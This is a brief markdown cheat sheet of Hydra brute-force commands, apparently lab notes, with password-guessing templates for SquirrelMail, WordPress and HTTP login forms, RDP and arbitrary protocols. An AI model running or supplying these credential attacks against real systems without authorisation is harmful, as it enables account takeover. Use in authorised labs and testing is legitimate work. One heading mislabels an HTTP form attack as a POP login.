# Commands for Hydra

command used to login to a pop server
```
hydra -l milesdyson -P log1.txt 10.10.229.129 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
```
Brute force against a protocol of your choice
```
hydra -P <wordlist> -v <ip> <protocol>
```
You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
```
hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>``
```
Attack a Windows Remote Desktop with a password list.
```
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
```
Craft a more specific request for Hydra to brute force.
```
hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
```
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
```
